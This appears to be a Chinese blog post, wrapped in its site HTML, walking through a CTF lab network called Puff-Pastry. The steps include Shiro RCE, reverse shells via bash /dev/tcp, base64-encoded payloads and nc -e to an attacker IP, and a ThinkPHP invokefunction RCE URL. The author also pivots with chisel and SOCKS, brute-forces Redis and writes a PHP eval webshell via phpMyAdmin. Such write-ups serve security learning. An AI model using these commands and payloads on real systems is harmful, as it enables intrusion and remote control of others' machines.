@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>puff-pastry | Seove0n</title><meta name="author" content="Seove0n"><meta name="copyright" content="Seove0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="前言靶机地址https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;Puff-Pastr  靶机拓扑图如下  渗透过程shiro发现rememberme字段，直接使用shiro工具进行rce就可以  然后 1cat &#x2F;flag.txt   下一步就是反弹shell，直接执行命令 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.141.112&#x2F;4444 0&gt;&amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="puff-pastry">
+<meta property="og:url" content="https://cxyadvancer.github.io/2026/08/10/puff-pastry/index.html">
+<meta property="og:site_name" content="Seove0n">
+<meta property="og:description" content="前言靶机地址https:&#x2F;&#x2F;github.com&#x2F;CTF-Archives&#x2F;Puff-Pastr  靶机拓扑图如下  渗透过程shiro发现rememberme字段，直接使用shiro工具进行rce就可以  然后 1cat &#x2F;flag.txt   下一步就是反弹shell，直接执行命令 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.141.112&#x2F;4444 0&gt;&amp;a">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cxyadvancer.github.io/image/4.jpg">
+<meta property="article:published_time" content="2026-08-10T06:32:04.000Z">
+<meta property="article:modified_time" content="2026-08-12T07:44:25.421Z">
+<meta property="article:author" content="Seove0n">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cxyadvancer.github.io/image/4.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "puff-pastry",
+  "url": "https://cxyadvancer.github.io/2026/08/10/puff-pastry/",
+  "image": "https://cxyadvancer.github.io/image/4.jpg",
+  "datePublished": "2026-08-10T06:32:04.000Z",
+  "dateModified": "2026-08-12T07:44:25.421Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Seove0n",
+      "url": "https://cxyadvancer.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/2.jpg"><link rel="canonical" href="https://cxyadvancer.github.io/2026/08/10/puff-pastry/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'puff-pastry',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-image: url(/image/2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/image/4.jpg" onerror="this.onerror=null;this.src='/null'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Seove0n</span></a><a class="nav-page-title" href="/"><span class="site-name">puff-pastry</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">puff-pastry</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-10T06:32:04.000Z" title="发表于 2026-08-10 14:32:04">2026-08-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-12T07:44:25.421Z" title="更新于 2026-08-12 15:44:25">2026-08-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机地址<code>https://github.com/CTF-Archives/Puff-Pastr</code>  靶机拓扑图如下</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image_20231112-201211-1786343708596-2.png" alt="image_20231112-201211"></p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h2><p>发现rememberme字段，直接使用shiro工具进行rce就可以</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810144155445.png" alt="image-20260810144155445"></p>
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810144313564.png" alt="image-20260810144313564"></p>
+<p>下一步就是反弹shell，直接执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.141.112/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>不行，换一种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0MS4xMTIvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0MS4xMTIvNDQ0NCAwPiYx | base64 -d &gt; /tmp/shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>这里出现一点小乌龙，就是用shiro工具有的可以执行反弹shell，有点不行，连写文件也不行</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810160708663.png" alt="image-20260810160708663"></p>
+<p>这个不行</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810160747188.png" alt="image-20260810160747188"></p>
+<p>这个也不行</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810160818023.png" alt="image-20260810160818023"></p>
+<p>这个可以</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810160846970.png" alt="image-20260810160846970"></p>
+<p>反弹之后查看ip</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810161148416.png" alt="image-20260810161148416"></p>
+<p>扫描靶机所处的c段，上传一下扫描攻击fscan</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.141.112:9999/fscan_static</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是扫描靶机所处的网段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.100.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810163107684.png" alt="image-20260810163107684"></p>
+<p>扫到了192.168.100.3存在thinkphp框架，接下来扫一下poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 192.168.100.0/24 -full</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810163234637.png" alt="image-20260810163234637"></p>
+<p>发现存在漏洞，现在做一下端口转发使用chisel，还是把工具下载到靶机中，攻击机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel.exe server -p 1332 --reverse</span><br></pre></td></tr></table></figure>
+
+<p>靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client http://192.168.141.168:1332 R:0.0.0.0:7788:192.168.100.2:80 </span><br></pre></td></tr></table></figure>
+
+<p>命令格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client &lt;server_ip&gt;:&lt;server_port&gt; R:&lt;服务端监听IP&gt;:&lt;服务端监听端口&gt;:&lt;客户端内网IP&gt;:&lt;客户端内网端口&gt; &amp;</span><br></pre></td></tr></table></figure>
+
+<p>执行完我本机方法访问<code>127.0.0.1:7788</code>等同于访问靶机的<code>192.168.100.3:80</code></p>
+<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810181344664.png" alt="image-20260810181344664"></p>
+<p>刚才扫出来了一个漏洞，工具检测一下</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810181657101.png" alt="image-20260810181657101"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] 存在ThinkPHP 5.0.22/5.1.29 RCE</span><br><span class="line">Payload: http://127.0.0.1:7788//?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810181858347.png" alt="image-20260810181858347"></p>
+<p>靶机出网接下来还是反弹shell，写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTQxLjExMi80NDQ0IDA+JjE= | base64 -d &gt;/tmp/shell.sh</span><br><span class="line">chmod +x /tmp/shell.sh</span><br><span class="line">./tmp/shell.sh</span><br></pre></td></tr></table></figure>
+
+<p>这里又出现了问题，，我真服了<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810184830728.png" alt="image-20260810184830728"></p>
+<p>成功了但是没完全成功，回来看shell文件</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810184908935.png" alt="image-20260810184908935"></p>
+<p>base64 解码后的字符串有换行 &#x2F; 多余空白字符，导致重定向语法破坏。<code>0&gt;&amp;1</code> 被解析成单独命令 <code>0</code>，直接报错，shell 崩溃退出</p>
+<p>又调试了其他paylaod还是不行，就换nc了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.141.112 4444 -e bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810185314225.png" alt="image-20260810185314225"></p>
+<p>这里是完整的命令，接下来就可以反射shell</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810185407517.png" alt="image-20260810185407517"></p>
+<p>反弹之后升级一下tty</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811193046146.png" alt="image-20260811193046146"></p>
+<p>之后还是看ip</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810191233393.png" alt="image-20260810191233393"></p>
+<p>发现了一个新的网段，还是上传工具用fscan扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_static -k 10.85.101.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260810192217338.png" alt="image-20260810192217338"></p>
+<p>这里看到扫出的服务还是比较多的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin - 10.85.101.3</span><br><span class="line">Thinkphp - 10.85.101.4</span><br><span class="line">Redis - 10.85.101.2</span><br></pre></td></tr></table></figure>
+
+<p>进行 socks 转发</p>
+<p>还是攻击机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel.exe server -p 1333 --reverse</span><br></pre></td></tr></table></figure>
+
+<p>靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.141.168:1333 R:0.0.0.0:6677:socks</span><br></pre></td></tr></table></figure>
+
+<p>同时浏览器配置代理</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811194230010.png" alt="image-20260811194230010"></p>
+<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>扫出来一个redis服务，首先尝试爆破一下密码</p>
+<p>redisbrute是一款爆破工具可以用来爆破密码，但是这个工具不支持代理，我们现在没有办法直接爆破，这里还需要<strong>Proxychains</strong>工具，为了“代理”某个没有代理支持的程序，<code>https://github.com/shunf4/proxychains-windows/releases/tag/0.6.8)</code></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811210644877.png" alt="image-20260811210644877"></p>
+<p>windows就用这个，不要下错版本。</p>
+<p>第一次是用proxychains需要修改几个配置<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811210735520.png" alt="image-20260811210735520"></p>
+<p>这里改为代理socks的端口</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811210815475.png" alt="image-20260811210815475"></p>
+<p>这个DIRECT代表内网直连不走代理，把这三个网段注释掉即可，接下来就可以爆破了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains_win32_x64.exe -f proxychains.conf redisbrute.exe -T 10.85.101.2:6379 -p rockyou.txt -t 8</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811211032663.png" alt="image-20260811211032663"></p>
+<p>爆破出密码时12345，接下来连接即可，这里是用的是hexhub，支持代理连接</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811211140249.png" alt="image-20260811211140249"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811211149992.png" alt="image-20260811211149992"></p>
+<p>连接后有flag</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811211212444.png" alt="image-20260811211212444"></p>
+<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>访问一下phpmyadmin</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811194657532.png" alt="image-20260811194657532"></p>
+<p>localhost&#x2F;root&#x2F;root弱口令直接进后台得到flag</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811195130332.png" alt="image-20260811195130332"></p>
+<p>然后可以写入shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[&quot;1&quot;]); ?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811212048152.png" alt="image-20260811212048152"></p>
+<p>按照官方题解是能写入shell的，这里修改一下权限</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811212338018.png" alt="image-20260811212338018"></p>
+<p>这样就可以写入，然后蚁剑连接，同样要配置代理</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811212636371.png" alt="image-20260811212636371"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811212727119.png" alt="image-20260811212727119"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/08/10/puff-pastry/image-20260811212922584.png" alt="image-20260811212922584"></p>
+<p>经过测试靶机不出网，这里就需要构建多层端口转发，首先攻击机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 1335 --reverse</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在 <code>Thinkphp</code> 主机上建立内网 -&gt; 外网的端口转发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.141.112:1335 7777:0.0.0.0:7777    //远端端口:本地地址:本地端口</span><br></pre></td></tr></table></figure>
+
+<p>整个过程是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin(10.85.101.4) → 10.85.101.3:7777 【跳板本地端口】</span><br><span class="line">        ↓</span><br><span class="line">跳板Chisel捕获7777流量，通过ws隧道发往攻击机192.168.200.129:1335</span><br><span class="line">        ↓</span><br><span class="line">攻击机Chisel服务端，将流量扔到本机 7777</span><br><span class="line">        ↓</span><br><span class="line">nc -lvnp 7777 成功拿到shell</span><br></pre></td></tr></table></figure>
+
